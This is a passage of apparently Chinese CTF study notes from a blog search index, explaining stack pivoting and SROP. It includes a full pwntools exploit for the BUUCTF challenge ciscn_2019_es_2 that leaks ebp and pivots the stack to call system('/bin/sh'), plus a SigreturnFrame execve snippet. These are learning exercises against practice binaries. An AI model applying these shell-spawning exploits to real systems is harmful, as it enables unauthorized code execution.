loc_400600，进而可以继续执行下面的汇编程序，从而退出这个gadgets。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</li></ul><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p> <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">栈迁移的原理&amp;&amp;实战运用 - ZikH26 - 博客园</a> </p><ul><li>换个地方getshell</li></ul><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>溢出长度不够，<code>payload</code>长度收到限制无法执行getshell</p><ul><li>能够栈溢出，起码也要覆盖ebp</li><li>要有可写的地方<ul><li>bss段</li><li>栈中</li></ul></li></ul><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li><p>核心</p><p>两次的<code>leave,ret</code><br><code>leave：mov esp,ebp;pop ebp</code></p><p><code>ret：pop eip</code></p></li><li><p>main函数里的栈迁移</p><p>第一次leave ret;将<strong>ebp给放入我们指定的位置</strong>（这个位置的就是迁移后的所在位置）</p><p>第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是<strong>system函数的plt地址</strong>）</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E7%AC%AC%E4%B8%80%E6%AC%A1.png" alt="第一次"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E7%AC%AC%E4%BA%8C%E6%AC%A1.png" alt="第二次"></p></li></ul><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>buu的ciscn_2019_es_2</p><p> <a href="https://buuoj.cn/challenges#ciscn_2019_es_2">BUUCTF在线评测</a> </p><ul><li><p>checksec</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718391990.png" alt="1737718391990"></p></li><li><p>IDA</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718423112.png" alt="1737718423112"><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718435019.png" alt="1737718435019"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718474976.png" alt="1737718474976"></p></li><li><p>思路</p><p>就是利用栈迁移，将ebp覆盖成s顶部地址，将返回地址覆盖成leave,ret的地址即可</p><p>现在主要是要得到s顶部的地址，ida里可以<strong>利用第一个read将<code>\0</code>覆盖掉</strong>从而泄露ebp上的内容，计算偏移后得到s地址</p></li><li><p>计算偏移</p><p>将断点下载nop处，gdb调试</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737719058637.png" alt="1737719058637"></p><p>得到偏移0x38</p></li><li><p>构造栈上数据</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737719250596.png" alt="1737719250596"></p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># r=remote(&quot;node5.buuoj.cn&quot;,25608)</span><br>r=process(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>leave_ret_addr=<span class="hljs-number">0x08048562</span><br>system_addr=<span class="hljs-number">0x08048400</span><br><span class="hljs-comment"># gdb.attach(r)</span><br><br>r.recvuntil(<span class="hljs-string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x25</span>+<span class="hljs-string">b&#x27;ANV&#x27;</span><br>r.send(payload1)  <span class="hljs-comment"># 注意这里要是send而不是sendline，否则在底下接收数据的时候会出错，因为多了一个回车那么就不再是recv到ANV了</span><br>r.recvuntil(<span class="hljs-string">&quot;ANV&quot;</span>)<br>ebp=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br>s_addr=ebp-<span class="hljs-number">0x38</span><br>binsh_addr=s_addr+<span class="hljs-number">0x10</span> <span class="hljs-comment"># 栈上距离s填充四格，所以要加16，也就是0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s_addr))<br><br>payload2=<span class="hljs-string">b&#x27;AAAA&#x27;</span>+p32(system_addr)+p32(main_addr)+p32(binsh_addr)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(s_addr)+p32(leave_ret_addr)<br>r.send(payload2)<br><span class="hljs-comment"># pause()</span><br>r.interactive()<br></code></pre></td></tr></table></figure></li></ul><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><ul><li><p>signal机制</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/signal.png" alt="signal"></p><ul><li>内核向进程发送signal机制，进程被挂起，进入内核态</li><li>内核态保存上下文：将所有寄存器压入栈中，压入signal信息。指向sigreturn的系统掉哦那个地址，也就是图中所示的1过程</li><li>在signal handler后执行sigreturn，恢复寄存器，我们所做的就是<strong>构造好栈，然后触发sigreturn，达到控制寄存器的目的，从而getshell</strong></li><li>32位sigreturn调用号为118</li><li>64位sigreturn调用号为15</li></ul></li><li><p>前提条件</p><ul><li>必须存在栈溢出</li><li>必须知道&#x2F;bin&#x2F;sh的地址</li><li>允许溢出的长度必须足够长</li><li>可以去系统调用sigreturn</li><li>知道syscall的地址</li></ul></li><li><p>如何利用</p><ul><li><p>我们通过伪造SignFrame，然后除法Sigreturn，将栈中构造好的数据送入寄存器，通过syscall执行系统调用</p></li><li><p>pwntools集成了SROP的攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 例子</span><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_execve<br>sigframe.rdi = stack_addr + <span class="hljs-number">0x120</span>  <span class="hljs-comment"># &quot;/bin/sh&quot; &#x27;s addr</span><br>sigframe.rsi = <span class="hljs-number">0x0</span><br>sigframe.rdx = <span class="hljs-number">0x0</span><br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br></code></pre></td></tr></table></figure><p>我们可以直接设置寄存器的值</p></li><li><p>首先设置rax，将返回地址覆盖成syscall，触发sigreturn即可</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>备注</title>
    <link href="/2025/01/18/%E5%A4%87%E6%B3%A8/"/>
    <url>/2025/01/18/%E5%A4%87%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><h2 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">hexo <span class="hljs-built_in">new</span> <span class="hljs-built_in">post</span> 文件名<br></code></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>步骤</p><ol><li>将图片放入对于文件夹下</li><li>md中输入<code>![图片下的备注](图片名)</code></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
